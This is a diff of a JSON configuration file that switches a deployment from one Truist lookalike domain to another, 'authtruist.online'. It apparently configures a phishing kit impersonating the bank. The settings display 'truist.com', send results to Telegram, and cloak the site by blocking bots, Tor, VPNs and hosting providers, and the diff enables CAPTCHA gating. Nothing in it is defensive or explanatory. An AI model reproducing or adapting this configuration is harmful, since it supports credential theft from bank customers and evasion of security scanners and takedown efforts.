@@ -745,14 +745,14 @@
                 ]
         },
         "apiBase": "/api",
-        "generatedAt": "2026-11-09T16:24:13.015Z",
-        "domain": "onlinetruistsupport.help",
+        "generatedAt": "2026-11-13T01:56:14.075Z",
+        "domain": "authtruist.online",
         "hosting": {
-                "domain": "onlinetruistsupport.help",
+                "domain": "authtruist.online",
                 "connectionType": "cloudflare-worker"
         },
         "allowedDomains": [
-                "onlinetruistsupport.help"
+                "authtruist.online"
         ],
         "subscription": {
                 "autoRenew": true,
@@ -769,23 +769,23 @@
                 "telegramNotifyOnResult": true
         },
         "security": {
-                "captcha": false,
+                "captcha": true,
                 "domains": [
-                        "onlinetruistsupport.help"
+                        "authtruist.online"
                 ],
                 "bannedIps": [],
                 "turnstile": {
-                        "enabled": false,
+                        "enabled": true,
                         "provider": "turnstile",
-                        "siteKey": "0x4AAAAAAFoPYvbukn2v47hW",
-                        "displayDomain": "Bank.truist.com"
+                        "siteKey": "0x4AAAAAAF6MVDVt0iGOIbNy",
+                        "displayDomain": "truist.com"
                 },
                 "whitelistIps": [],
                 "vpnProxyRules": {
                         "blockTor": true,
                         "blockVpnProxies": true,
                         "blockHostingProviders": true,
-                        "reputationFailureMode": "allow"
+                        "reputationFailureMode": "challenge"
                 },
                 "blockedDevices": [
                         "bot",
